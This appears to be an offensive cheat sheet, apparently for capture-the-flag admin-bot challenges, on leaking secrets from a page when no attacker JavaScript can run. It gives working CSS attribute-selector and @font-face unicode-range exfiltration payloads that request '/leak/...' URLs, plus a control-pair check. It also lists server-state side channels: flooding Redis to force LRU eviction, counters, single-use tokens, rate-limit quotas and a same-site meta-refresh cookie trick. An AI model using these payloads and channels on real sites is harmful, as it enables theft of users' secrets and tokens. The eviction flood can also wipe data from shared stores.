# Sealed deep — the no-JS channels, exhaustively

Every oracle that works when no attacker JS runs anywhere — the
declarative and server-state channels.

---

## 1. The CSS-selector oracle — the declarative workhorse

```css
/* a reflected secret in an attribute — a CSS attribute-selector matches it */
body[secret^="ab"]{--m_ab:url('/leak/ab')}
body[secret$="ef"]{--m_ef:url('/leak/ef')}
body[secret*="abc"]{--m_abc:url('/leak/abc')}
body[secret="full"]{--m_full:url('/leak/full')}
/* the consumer — a multi-layer background fetches the matched URLs */
#trig{background-image:var(--m_ab,none),var(--m_ef,none),var(--m_abc,none),var(--m_full,none)}
```

```text
the match is DECLARATIVE — no JS needed. a matching rule sets a
custom property; the consumer's multi-layer background fetches
exactly the matched URLs — the requested URLs ARE the match. the
channel's bandwidth is the number of parallel rules — thousands of
selectors = thousands of URLs = a char-set or a whole secret.
```

## 2. The @font-face unicode-range oracle — the char-set channel

```css
/* one @font-face per alphabet char — each its own unicode-range + URL */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
/* ... the whole 62-char alphabet */
#secret{font-family:x;display:block !important}
```

```text
the browser downloads a face ONLY when a char inside its
unicode-range renders — the requested font URLs ARE the character
SET of the rendered text. a sorted secret's set IS the answer; an
unsorted secret needs an n-gram/beam reconstruction.
the requirement: a font-src wildcard ('self' *) allows the external
font host.
```

## 3. The LRU-eviction channel — the recency read

```text
a redis with --maxmemory-policy allkeys-lru — a GET that touches a
key refreshes it, marking it recently-used. flood the store to
force eviction → the surviving keys are the recently-touched ones —
the bot's GETs — a thousand-bit-per-visit channel.
```

```text
the blast_radius: the flood evicts EVERY other key — possibly the
secret itself. only flood an instance that's yours alone; check
whether the secret lives in the same store.
```

## 4. The counter channel — the next-value read

```text
a GET that increments a counter you can read — 'the counter is N+1
after the bot's visit' → the bot's GET ran → the candidate matched.
a few bits per visit — the counter's value is the channel.
```

## 5. The one-shot-token channel — the single-use flag

```text
a GETDEL/single-use nonce — 'did the token survive the bot's visit'
is one bit AND burns the check — spend it LAST, after the cheaper
channels narrow the answer.
```

## 6. The rate-limit channel — the quota read

```text
a bucket with a remaining count — a consumed quota = 'the GET ran'.
a few bits — the remaining quota is the channel.
```

## 7. The 'last seen' channel — the recency timestamp

```text
a timestamp a GET updates — 'the last-seen time is T' → 'the GET
ran at T' — a recency read.
```

## 8. The DOM-writeback channel — a screenshotting bot's read

```text
a bot that screenshots the page — a DOM-writeback (the secret
rendered visibly) is the read-back channel — no external exfil
needed.
```

## 9. The meta-refresh channel — a same-site navigation

```text
a meta-refresh issued BY THE TARGET is a same-site navigation — it
carries the Lax cookie a cross-site fetch wouldn't. the sealed
shape's whole design avoids the cross-site cookie question — the
bot's request to the target itself is same-site.
```

## 10. The stylesheet-carrier — the CSS oracle's delivery

```text
the CSS rules live in an uploaded/attacker-influenced stylesheet —
a <link rel=stylesheet href="/paper/<id>"> + a <div id=trig> — the
rules fire declaratively when the page loads.
```

## The per-channel channel-bandwidth

```text
CSS-selector oracle      — thousands of parallel rules — a char-set
@font-face oracle        — a whole character-set per load
LRU eviction             — thousands of bits — the surviving keys
counter++                — a few bits — the next value
one-shot token           — one bit — the consumed-or-not
rate-limit bucket        — a few bits — the remaining quota
'last seen'              — a recency read — a timestamp
DOM-writeback            — a visible read — a screenshot
meta-refresh             — a same-site navigation — a cookie bypass
stylesheet-carrier       — the declarative delivery — the rules fire
```

## The sealed-shape constraints — the gates

```text
- no attacker JS anywhere — the channel is DECLARATIVE or SERVER-SIDE
- the CSS oracle needs the secret in an attribute OR a font wildcard
- the @font-face needs a font-src wildcard
- the LRU channel needs a redis --maxmemory-policy allkeys-lru
- the counter needs a readable next value
- the one-shot token needs a GETDEL/single-use surface
- the meta-refresh needs a target-issued navigation
```

## The control-pair pattern — always

```css
body[secret]{--yes:url('/leak/YES')}
body[nosuchattr]{--no:url('/leak/NO')}
#trig{background-image:var(--yes,none),var(--no,none)}
/* YES hits + NO doesn't → the channel works */
```

## The falsifier — when the sealed surface is dead

```text
a sealed shape with NO CSS oracle (the secret isn't in an attribute
and there's no font wildcard) AND NO server-state channel (no
redis, no counter, no token, no rate-limit) → the oracle surface
is dead → a different class.
```
